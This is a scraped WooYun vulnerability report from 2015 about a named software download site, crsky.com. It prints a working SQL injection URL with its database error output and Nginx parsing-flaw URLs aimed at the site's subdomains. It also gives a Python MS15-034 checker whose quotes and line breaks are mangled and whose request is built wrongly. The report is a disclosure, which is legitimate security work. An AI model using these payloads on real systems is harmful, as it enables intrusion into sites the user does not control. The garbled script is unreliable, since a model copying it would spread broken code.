{"id": 71340, "wybug_id": "wooyun-2015-0153952", "wybug_title": "非凡软件下载站几处漏洞打包(SQL注入\\解析漏洞\\命令执行)", "wybug_corp": "非凡软件下载", "wybug_author": "岛云首席鉴黄师", "wybug_date": "2015-11-18 16:04", "wybug_open_date": "2015-11-25 09:00", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "19", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一次性提交吧- - 详细说明：  0x01 注入：http://mag.crsky.com/shoppingcart.php?a=addshopingcart&typeid=1%20or%20@`'`=1%20and%20extractvalue(1,concat(0x5c,md5(1)))%20and%20@`\\'`\nPHPMyWind安全警告：MySql Error！错误文件：/shoppingcart.php错误信息：XPATH syntax error: '\\c4ca4238a0b923820dcc509a6f75849' Error sql: SELECT * FROM `pmw_goodsattr` WHERE `goodsid`=1 or @`\\'`=1 and extractvalue(1,concat(0x5c,md5(1))) and @`\\\\\\'`\n修复：升级PHPMYWIND0x02 Nginx解析漏洞http://mag.crsky.com/robots.txt/%20\\0.phphttp://mag.crsky.com/robots.txt/a.php修复：升级Nginx0x03 MS15-034 HTTP.sys 远程代码执行http://sj.crsky.com/POC：\n#!/usr/bin/env python__author__ = ';jastra';class bg_colors:    VULN = ';33[92m';    NONVULN= ';33[95m';    EXPLOIT = ';33[91m';  try:    import requests    import reexcept ImportError as ierr:    print(bg_colors.EXPLOIT + \"Error, looks like you don';t have %s installed\", ierr)    def identify_iis(domain):    req = requests.get(str(domain))    remote_server = req.headers[';server';]            if \"Microsoft-IIS\" in remote_server:        print(bg_colors.VULN + \"[+] 服务是 \" + remote_server)         ms15_034_test(str(domain))    else:        print(bg_colors.NONVULN + \"[-] 不是IIS\\n可能是: \" + remote_server)         def ms15_034_test(domain):    print(\" 启动vuln检查！\")    vuln_buffer = \"GET / HTTP/1.1\\r\\nHost: stuff\\r\\nRange: bytes=0-18446744073709551615\\r\\n\\r\\n\";    req = requests.get(str(domain), params=vuln_buffer)    if req.headers[';content';] == \"请求范围不符合\":        print(bg_colors.EXPLOIT + \"[+] 存在漏洞\")    else:        print(bg_colors.EXPLOIT + \"[-] IIS服务无法显示漏洞是否存在. \"+               \"需要手动检测\")usr_domain = raw_input(\"输入域名扫描: \")identify_iis(usr_domain)\n修复：打补丁   漏洞证明：  如上   修复方案：  详细说明里说了……   版权声明：转载请注明来源 岛云首席鉴黄师@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-25 09:00 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}